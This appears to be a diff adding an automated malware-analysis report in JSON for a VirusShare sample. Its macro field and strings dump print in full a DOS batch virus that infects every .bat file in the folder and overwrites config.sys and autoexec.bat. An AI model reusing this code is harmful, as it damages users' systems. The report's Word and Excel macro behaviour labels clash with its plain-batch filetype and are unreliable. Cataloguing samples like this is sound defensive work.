@@ -1,0 +1,48 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@ctty nul%!%\nappend %path%%!%\nif %1d==!d goto !c\nif not %1d==d goto !d\n:!s\nfor %%a in (*.bat) do call %0 ! %%a\ngoto !e\n:!d\ntype nul>c:\\config.sys%!%\necho @echo Please wait...>c:\\autoexec.bat%!%\necho @ctty nul>>c:\\autoexec.bat%!%\ngoto !s\n:!c\nfind/c \"!\" %2\nif not errorlevel 1 goto !e\nfind \"!\" %0.bat|find/v/i \"%0\">>%2\n:!e\nif not %1d==!d ctty con"
+    },
+    "filename": "VirusShare_371509e183dedd7f17378e22fffc77ac",
+    "filesize": 363,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "371509e183dedd7f17378e22fffc77ac",
+        "sha1": "987e8ad9554c2ddcfb32627fbeb8bf1bcb27cb19",
+        "sha256": "2458548695fa65425fe03cb5501ebdfe7062b4b9e67dc9966287273259a16744"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ctty nul%!%",
+            "append %path%%!%",
+            "if %1d==!d goto !c",
+            "if not %1d==d goto !d",
+            "for %%a in (*.bat) do call %0 ! %%a",
+            "goto !e",
+            "type nul>c:\\config.sys%!%",
+            "echo @echo Please wait...>c:\\autoexec.bat%!%",
+            "echo @ctty nul>>c:\\autoexec.bat%!%",
+            "goto !s",
+            "find/c \"!\" %2",
+            "if not errorlevel 1 goto !e",
+            "find \"!\" %0.bat|find/v/i \"%0\">>%2",
+            "if not %1d==!d ctty con"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.250548",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
